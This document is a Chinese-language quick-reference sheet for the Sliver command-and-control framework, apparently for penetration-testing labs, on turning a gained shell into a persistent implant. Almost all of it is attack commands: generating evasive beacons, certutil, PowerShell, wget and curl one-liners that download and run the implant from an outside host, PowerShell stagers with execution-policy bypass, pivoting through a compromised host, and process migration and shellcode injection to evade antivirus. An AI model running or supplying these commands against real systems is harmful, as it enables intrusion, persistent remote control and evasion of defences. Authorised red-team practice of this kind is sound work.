# Sliver — 新主機取得 Shell → 植入 Beacon / Session 速查

## 前置：確認 Listener 已啟動

```bash
sliver > jobs
# 確認有對應 Listener 在跑，沒有就啟動

sliver > https --lhost 0.0.0.0 --lport 443    # 推薦
# 或
sliver > mtls --lhost 0.0.0.0 --lport 4444
```

---

## 情境一：有互動式 Shell，目標可出網

> 適用：RCE、Web Shell、SSH 取得的 bash/cmd/powershell

### Windows 目標

```bash
# ── Kali 端：生成 Implant ──
sliver > generate beacon \
  --https 10.10.14.62:443 \
  --os windows --arch amd64 \
  --format exe \
  --seconds 30 --jitter 20 \
  --evasion \
  --save /tmp/beacon.exe

# 起 HTTP 伺服器供目標下載
python3 -m http.server 8080 -d /tmp/

# ── 目標端（Windows Shell 內）──
# CMD
certutil -urlcache -split -f http://10.10.14.62:8080/beacon.exe C:\Windows\Temp\b.exe && C:\Windows\Temp\b.exe

# PowerShell
iwr http://10.10.14.62:8080/beacon.exe -OutFile C:\Windows\Temp\b.exe; Start-Process C:\Windows\Temp\b.exe

# ── Kali 端：等待回連 ──
sliver > beacons
sliver > use <ID>
sliver (BEACON) > whoami
```

### Linux 目標

```bash
# ── Kali 端：生成 Implant ──
sliver > generate beacon \
  --https 10.10.14.62:443 \
  --os linux --arch amd64 \
  --format exe \
  --seconds 30 --jitter 20 \
  --save /tmp/beacon_linux

# ── 目標端（Linux Shell 內）──
wget http://10.10.14.62:8080/beacon_linux -O /tmp/b && chmod +x /tmp/b && /tmp/b &

# 或 curl
curl http://10.10.14.62:8080/beacon_linux -o /tmp/b && chmod +x /tmp/b && /tmp/b &
```

## 情境二：Shell 受限 / 無法直接傳大檔（用 Stager）

> 適用：Web Shell 指令長度限制、目標只能執行 Shellcode

```bash
# ── Kali 端 ──

# 1. 建立 Profile（定義 Beacon 規格）
sliver > profiles new --https 10.10.14.62:443 --format shellcode --os windows win-stager

# 2. Stage Listener（目標來這裡拿 Stage 2）
sliver > stage-listener --url tcp://10.10.14.62:4443 --profile win-stager

# 3. HTTPS Listener（Beacon 回連用）
sliver > https --lhost 0.0.0.0 --lport 443

# 4. 生成小型 Stager（給目標執行）
sliver > generate stager \
  --lhost 10.10.14.62 --lport 4443 \
  --protocol tcp \
  --format powershell \
  --save /tmp/stager.ps1

# ── 目標端（執行 Stager）──
powershell -ep bypass -f \\10.10.14.62\share\stager.ps1
# 或透過 Web Shell 執行
```

## 情境三：目標不出網，透過跳板機 Pivot

> 適用：內網主機、防火牆封鎖出網

```bash
# 假設已有一個 Session 在跳板機（DMZ01）
sliver > sessions
sliver > use <DMZ01_SESSION_ID>

# 在跳板機啟動 TCP Pivot Listener
sliver (DMZ01) > pivots tcp --lhost 0.0.0.0 --lport 9001

# ── Kali 端：生成透過 Pivot 回連的 Implant ──
sliver > generate beacon \
  --tcp-pivot 172.16.139.10:9001 \   # 跳板機 IP:Port
  --os windows --arch amd64 \
  --format exe \
  --save /tmp/pivot-beacon.exe

# 傳到目標並執行（透過跳板機已有的 Session 上傳）
sliver (DMZ01) > upload /tmp/pivot-beacon.exe C:\Windows\Temp\pb.exe
sliver (DMZ01) > execute --exe C:\Windows\Temp\pb.exe

# ── Kali 端：等待回連（透過 Pivot 路由）──
sliver > beacons
sliver > use <NEW_BEACON_ID>
```

## 取得 Beacon 後的第一步確認

```bash
sliver > beacons
sliver > use <ID>

# 基本確認
sliver (BEACON) > info          # OS、版本、PID、C2 通道
sliver (BEACON) > whoami        # 當前身分
sliver (BEACON) > getpid        # 確認 PID（之後 migrate 用）
sliver (BEACON) > tasks fetch   # 取得上面指令的回應

# 確認網路位置（判斷後續橫向路線）
sliver (BEACON) > ifconfig
sliver (BEACON) > tasks fetch

# 遷移到穩定程序（降低掉線風險）
sliver (BEACON) > ps
sliver (BEACON) > tasks fetch
sliver (BEACON) > migrate --pid <explorer.exe 的 PID>
sliver (BEACON) > tasks fetch
```

## 情境對照速查

| 情況 | 方法 | 格式 |
|------|------|------|
| 有 Shell，目標出網 | 直接 `generate beacon` + 下載執行 | `exe` |
| 有 Shell，限制大小 | Stager | `powershell` / `csharp` |
| 目標不出網，有跳板 | TCP Pivot | `exe` |
| 需要注入程序 | `generate --format shellcode` + 注入器 | `shellcode` |
| 需要 DLL Side-load | `generate --format dll` | `dll` |
| 需要服務持久化 | `generate --format service` | `service` |

## 快速判斷流程

```
取得 Shell
    │
    ├─ 目標可出網？
    │       ├─ Yes → generate beacon (exe) → 傳過去執行
    │       └─ No  → 有跳板 Session？
    │                   ├─ Yes → pivots tcp → generate --tcp-pivot
    │                   └─ No  → SOCKS5 Proxy 從外部打入
    │
    ├─ Shell 受限（長度/格式）？
    │       └─ Yes → Stager（ps1/csharp）
    │
    └─ 需要記憶體執行（有 AV）？
            └─ Yes → shellcode 格式 + execute-shellcode 注入
```
